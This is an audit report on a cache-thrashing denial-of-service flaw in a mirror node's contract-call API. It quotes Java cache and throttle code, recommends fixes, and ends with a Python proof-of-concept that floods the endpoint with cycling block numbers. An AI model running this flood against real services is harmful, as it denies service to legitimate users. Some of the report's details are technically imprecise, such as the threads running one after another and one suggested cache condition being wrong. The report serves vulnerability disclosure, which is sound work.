Audit Report

## Title
Cache-Thrashing DoS via Unbounded Historical Block Number Enumeration Exhausts Global Rate Limit and Forces Continuous DB Lookups

## Summary
The `recordFileIndex` Caffeine cache is hardcoded to `maximumSize=10000` with `expireAfterWrite=10m`. An unauthenticated attacker cycling through more than 10,000 distinct block numbers continuously evicts cache entries, causing every request to execute `SELECT … WHERE index = ?` against the database. Because the application's only throttle is a single JVM-wide token bucket (default 500 req/s, no per-IP partitioning), one attacker can monopolize the entire request budget, denying service to all legitimate users while maximizing database load.

## Finding Description

**Cache configuration — not operator-tunable**

`EvmConfiguration.java` lines 153–164 define `cacheManagerRecordFileIndex` with hardcoded parameters:

```java
final var caffeine = Caffeine.newBuilder()
        .expireAfterWrite(10, TimeUnit.MINUTES)
        .maximumSize(10000)
        .recordStats();
```

Every other cache in the same class (`cacheManagerSystemFile`, `cacheManagerSystemFileExchangeRates`) delegates to `CacheProperties` for its spec, making it operator-tunable. `cacheManagerRecordFileIndex` does not; changing the size or TTL requires a code change and redeployment. [1](#0-0) [6](#0-5) 

**Cache consumer — empty Optional is cached**

`RecordFileRepository.findByIndex` at lines 27–29:

```java
@Cacheable(cacheNames = CACHE_NAME, cacheManager = CACHE_MANAGER_RECORD_FILE_INDEX,
           unless = "#result == null")
@Query("select r from RecordFile r where r.index = ?1")
Optional<RecordFile> findByIndex(long index);
```

The `unless` guard is `#result == null`. Spring evaluates this SpEL expression against the raw return value before unwrapping. `Optional.empty()` is not null, so lookups for non-existent block numbers cache the empty Optional and consume a slot. Both existing and non-existent block numbers fill the same 10,000-slot cache. [2](#0-1) 

**Global-only throttle — no per-IP partitioning**

`ThrottleConfiguration.java` creates a single shared `Bucket`:

```java
@Bean(name = RATE_LIMIT_BUCKET)
Bucket rateLimitBucket() {
    long rateLimit = throttleProperties.getRequestsPerSecond(); // default 500
    ...
    return Bucket.builder().addLimit(limit).build();
}
```

`ThrottleManagerImpl.throttle()` consumes from this single bucket for every caller:

```java
if (!rateLimitBucket.tryConsume(1)) {
    throw new ThrottleException(REQUEST_PER_SECOND_LIMIT_EXCEEDED);
}
```

`RequestProperties` filters (the only other throttle mechanism) match on request content fields (`to`, `data`, etc.), not on caller IP or identity. There is no per-IP, per-session, or per-user rate limiting anywhere in the stack. [3](#0-2) [4](#0-3) [5](#0-4) 

## Impact Explanation
A single unauthenticated attacker can:
- Consume the entire 500 req/s global budget, causing HTTP 429 for every legitimate caller.
- Force up to 500 `SELECT … WHERE index = ?` queries per second against the database with zero cache benefit, amplifying DB load compared to normal operation where repeated block lookups are served from cache.
- Sustain the attack indefinitely at negligible cost — no credentials, no gas, no special knowledge beyond the public API contract.

## Likelihood Explanation
The attack requires no privileges. The `block` field of `ContractCallRequest` accepts arbitrary numeric values. Cycling through 20,000 integers in a loop is trivial. The attacker does not need to exceed the rate limit — staying just under 500 req/s is sufficient to monopolize the service. The attack is fully repeatable and stateless.

## Recommendation

1. **Fix the `unless` condition** — change `unless = "#result == null"` to `unless = "#result != null && !#result.isPresent()"` (or `unless = "#result?.isEmpty()"`) so that empty Optional results are not cached and do not consume slots. [2](#0-1) 

2. **Make the cache configurable** — back `cacheManagerRecordFileIndex` with `CacheProperties` (as done for other caches in `EvmConfiguration`) so operators can tune `maximumSize` and TTL without a code change. [1](#0-0) 

3. **Add per-IP rate limiting** — introduce a per-source-IP token bucket (e.g., using a `ConcurrentHashMap<String, Bucket>` keyed by `request.getRemoteAddr()` / `X-Forwarded-For`) in `ThrottleManagerImpl` or a servlet filter, so a single attacker cannot exhaust the global budget. [7](#0-6) 

4. **Consider a block-number validation guard** — reject or short-circuit requests for block numbers far outside the known chain range (e.g., beyond `findLatest().index + 1`) before they reach the cache or database.

## Proof of Concept

```python
import requests, itertools, threading

TARGET = "https://<mirror-node>/api/v1/contracts/call"

def flood(start, end):
    for block in range(start, end):
        requests.post(TARGET, json={
            "block": hex(block),
            "to": "0x0000000000000000000000000000000000000001",
            "data": "0x",
            "gas": 21000
        })

# Phase 1: fill cache slots 0–9999
t1 = threading.Thread(target=flood, args=(0, 10000))
# Phase 2: evict all of phase 1, force 10000 DB queries
t2 = threading.Thread(target=flood, args=(10000, 20000))
# Phase 3: evict phase 2, force another 10000 DB queries
t3 = threading.Thread(target=flood, args=(0, 10000))

for t in [t1, t2, t3]:
    t.start(); t.join()
# Repeat indefinitely — legitimate callers receive HTTP 429
```

Each phase evicts the previous 10,000 cache entries (Caffeine size-based eviction), causing every request in the new phase to execute `SELECT * FROM record_file WHERE index = ?`. At 500 req/s the database receives 500 uncached queries per second with zero cache benefit.
